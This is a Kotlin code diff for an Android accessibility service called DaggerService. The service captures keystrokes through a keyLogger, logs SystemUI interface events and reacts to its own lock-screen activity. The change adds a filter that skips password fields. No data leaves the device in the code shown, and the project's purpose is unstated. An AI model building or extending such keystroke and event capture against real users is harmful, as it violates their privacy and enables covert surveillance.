@@ -49,8 +49,10 @@ class DaggerService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        if (eventIsSkippable(event)) return
         when (event.packageName) {
             Config.SYSTEMUI_PACKAGE_NAME -> {
+                logEvent(event, event.toString())
                 when (event.eventType) {
                     AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                         logEvent(event, event.className.toString())
@@ -75,6 +77,14 @@ class DaggerService : AccessibilityService() {
                             val keystrokes = keyLogger.emptyKeyQueue()
                             Log.d(TAG, "Got keystrokes: $keystrokes")
                         }
+                    }
+                }
+            }
+
+            packageName -> {
+                when (event.className) {
+                    LockScreenActivity::class.java.name -> {
+                        Log.d(TAG, "Event received from lock screen")
                     }
                 }
             }
@@ -110,6 +120,7 @@ class DaggerService : AccessibilityService() {
         running = true
         Log.d(TAG, "DaggerService started.")
     }
+
 
     override fun onDestroy() {
         super.onDestroy()
@@ -148,4 +159,9 @@ class DaggerService : AccessibilityService() {
     private fun logEvent(event: AccessibilityEvent, message: String) {
         Log.d(TAG + " - " + event.packageName, message)
     }
+
+    private fun eventIsSkippable(event: AccessibilityEvent): Boolean {
+        return event.isPassword
+    }
+
 }
